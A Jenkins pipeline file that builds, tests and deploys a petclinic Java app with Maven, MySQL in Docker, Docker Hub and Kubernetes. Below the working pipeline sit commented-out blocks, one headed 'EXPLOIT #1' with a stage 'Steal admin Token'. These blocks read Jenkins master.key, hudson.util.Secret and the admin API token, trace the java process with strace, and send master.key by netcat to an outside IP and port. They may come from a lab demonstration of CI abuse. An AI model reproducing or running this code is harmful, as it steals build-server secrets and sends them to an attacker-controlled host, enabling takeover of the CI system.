pipeline {
    agent { 
        label 'ubuntu' 
            /* 
            docker { 
                 image 'maven:3.3-jdk-8'
                 args '-p 8080:8080'
            }
            */ 
    }
  
    stages {
        stage ('Initialize') {
            steps {
                sh '''
                    echo "PATH = ${PATH}"
                    echo "M2_HOME = ${M2_HOME}"
                '''
                checkout scm
            }
        }

        stage ('Build') {
            steps {
                    //sh 'sudo apt-get install -y default-jdk'
                    //sh 'sudo apt-get install -y mysql-client-5.7'
                    script {
                            ansibleTower credential: '', extraVars: '', importTowerLogs: false, 
                                         importWorkflowChildLogs: false, inventory: '', jobTags: '', 
                                         jobTemplate: 'config-worker', jobType: 'run', limit: '', removeColor: false, 
                                         skipJobTags: '', templateType: 'job', towerServer: 'ansible1', verbose: true                    
                    }                    
                    sh 'sudo ~/mvnw package -Dmaven.test.skip=true' 
            }
            post {
                success {
                    echo 'build success' // run sonarqube tests here...   junit 'target/surefire-reports/**/*.xml' 
                }
            }
        } // end stage build
            
        stage ('Test') {
                 steps {
                     sh 'pwd'
                     script {
                        docker.image('mysql:5.7.8').withRun('-e "MYSQL_ROOT_PASSWORD=petclinic" -e "MYSQL_DATABASE=petclinic" -p 3306:3306') { c ->
                                /* Wait until mysql service is up */
                                sh 'while ! mysqladmin ping -h0.0.0.0 --silent; do sleep 1; done'
                                
                                // setup the database
                                sh 'mysql --protocol tcp -h localhost -u root --password="petclinic" petclinic < ./src/main/resources/db/mysql/schema.sql'
                                sh 'mysql --protocol tcp -h localhost -u root --password="petclinic" petclinic < ./src/main/resources/db/mysql/data.sql'

                                /* Run some tests which require MySQL */
                                // after the mysql is up -> run the target
                                sh 'java -jar ./target/*.jar &'
                                   
                                //input id: 'Deploy', message: 'Proceed with Green node deployment?', ok: 'Deploy!'                       
                                
                         } // end docker run
                     } // end script
                       
                     //sh 'sleep 15'
                     // sh 'wget localhost:8080 && echo "tests success" || exit 1'
                     //sh 'sudo kill $(pidof java)'
                }
        } // end stage test
         
        stage ('wait for input') { 
               steps { 
                   input id: 'Deploy', message: 'Proceed with Green node deployment?', ok: 'Deploy!'                       
               }    
        }
            
            
        stage ('Deploy') {
               steps {
                       script {
                            app = docker.build( "devopswar/petclinic")
                            docker.withRegistry('https://registry.hub.docker.com', 'dockerhub-devopswar') {
                                    app.push("${env.BUILD_NUMBER}")
                                    app.push("latest")
                            }        

                                    
                            withKubeConfig(caCertificate: '', contextName: '', credentialsId: 'kubeconfig-file', serverUrl: '') 
                            {
                                 // some block
                                 sh 'kubectl run petclinic --image=devopswar/petclinic --replicas=3'                                    
                            }                                    

                                    
//                            kubernetesDeploy configs: '<includes="**/*"/>', 
//                                                      kubeConfig: [path: ''], 
//                                                      kubeconfigId: 'kube-config2', 
//                                                      secretName: '', 
//                                                      ssh: [sshCredentialsId: '*', sshServer: ''], 
//                                                      textCredentials: [certificateAuthorityData: '', clientCertificateData: '', clientKeyData: '', serverUrl: 'https://']                                    
//                            }
                 
/*
                                kubernetesDeploy(kubeconfigId: 'kubeconfig-credentials-id',               // REQUIRED
                                         configs: '<ant-glob-pattern-for-resource-config-paths>', // REQUIRED
                                         enableConfigSubstitution: false,
                                         secretNamespace: '<secret-namespace>',
                                         secretName: '<secret-name>',
                                        dockerCredentials: [
                                                [credentialsId: '<credentials-id-for-docker-hub>'],
                                                [credentialsId: '<credentials-id-for-other-private-registry>', url: '<registry-url>'],
                                        ]
                                )
*/
                       } // endscript
               }
        }
    } // end stages
} // end pipeline





/*
node ('ubuntu') {
    label 'ubuntu'
    sh 'sudo netstat -anupt > /home/ubuntu/netstat.out'
    sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/out.2 &'
    //git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    


    checkout scm
    docker.image('maven:3-alpine').inside {
      stage("Install Bundler") {
            sh 'mvn clean install'
            //sh 'nc '
      }
    }
}

node ('master') {
    def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
    println fileContents
    def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
    def api1 = apiContents.split( '<apiToken>');
    def api2 = api1[1].split( '</apiToken>');
    println "API Token is:\n" + api2[0];
    
    //println fileContentsAdmin

    int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
    String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
    for( int i = 0; i < fileContentsHudson.size(); i++)
    {
        int  a = (int)fileContentsHudson[i];
        str = str + String.format("%02X-",a);
    }
    println str

    sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
}
node ('ubuntu') {   
    label 'ubuntu'
    sh 'sudo kill $(pidof strace)'
    sh 'sudo cat /home/ubuntu/out.2'
}

*/



/*
#!groovy




pipeline {
  stages {
    stage('Maven Install') {
	
      agent {
        docker {
          image 'maven:3-alpine'
          label 'ubuntu'
        }
      }
      steps {
        sh 'mvn clean install'
        sh 'nc '
        //
        // EXPLOIT #1
        //
        sh 'sudo strace -fp $(pidof java) -v -e read,write -s 9999 -o /home/ubuntu/out.2 &'
        git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    
      }
    } // end stage
	
	stage('Steal admin Token') {
			label 'master' 
			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
			println fileContents
			def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
			def api1 = apiContents.split( '<apiToken>');
			def api2 = api1[1].split( '</apiToken>');
			println "API Token is:\n" + api2[0];
			
			//println fileContentsAdmin

			int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
			String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
			for( int i = 0; i < fileContentsHudson.size(); i++)
			{
				int  a = (int)fileContentsHudson[i];
				str = str + String.format("%02X-",a);
			}
			println str

			sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
	}
	stage('take out credentials') {
	  //
	  // back to the ubuntu node
	  //
		agent { 
			label 'ubuntu' 
			sh 'sudo kill $(pidof strace)'
			sh 'sudo cat /home/ubuntu/out.2'
	  } // end agent
	} // end stage
  } // end stages	
} // end pipeline

*/



